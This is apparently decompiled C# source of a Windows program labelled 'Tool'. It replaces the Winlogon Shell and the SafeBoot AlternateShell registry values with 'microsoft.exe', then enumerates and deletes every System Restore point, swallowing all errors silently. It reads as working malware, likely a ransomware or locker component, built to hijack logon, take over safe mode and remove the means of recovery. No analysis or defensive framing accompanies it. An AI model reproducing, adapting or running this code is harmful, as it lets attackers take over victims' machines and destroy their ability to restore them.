using System;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace Tool;

internal class Program
{
	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private static void Main(string[] args)
	{
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_012d: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
			RegistryKey registryKey3 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			registryKey3.SetValue("Shell", "microsoft.exe", RegistryValueKind.String);
			registryKey.Flush();
			registryKey.Close();
			RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			RegistryKey registryKey5 = registryKey4.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			registryKey5.SetValue("Shell", "microsoft.exe", RegistryValueKind.String);
			registryKey5.Flush();
			registryKey5.Close();
			RegistryKey registryKey6 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
			RegistryKey registryKey7 = registryKey6.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);
			registryKey7.SetValue("AlternateShell", "microsoft.exe", RegistryValueKind.String);
			registryKey7.Flush();
			registryKey7.Close();
			RegistryKey registryKey8 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			RegistryKey registryKey9 = registryKey8.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);
			registryKey9.SetValue("AlternateShell", "microsoft.exe", RegistryValueKind.String);
			registryKey9.Flush();
			registryKey9.Close();
			int num = 0;
			int[] array = new int[50];
			int num2 = 0;
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			StringBuilder stringBuilder = new StringBuilder();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					num = instances.get_Count();
					stringBuilder.AppendLine((string)((ManagementBaseObject)val2).get_Item("description") + Convert.ToChar(9) + ((uint)((ManagementBaseObject)val2).get_Item("sequencenumber")).ToString());
					string value = ((ManagementBaseObject)val2).get_Item("sequencenumber").ToString();
					array[num2] = Convert.ToInt32(value);
					num2++;
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			for (int i = 0; i < num; i++)
			{
				SRRemoveRestorePoint(array[i]);
			}
		}
		catch
		{
		}
	}
}
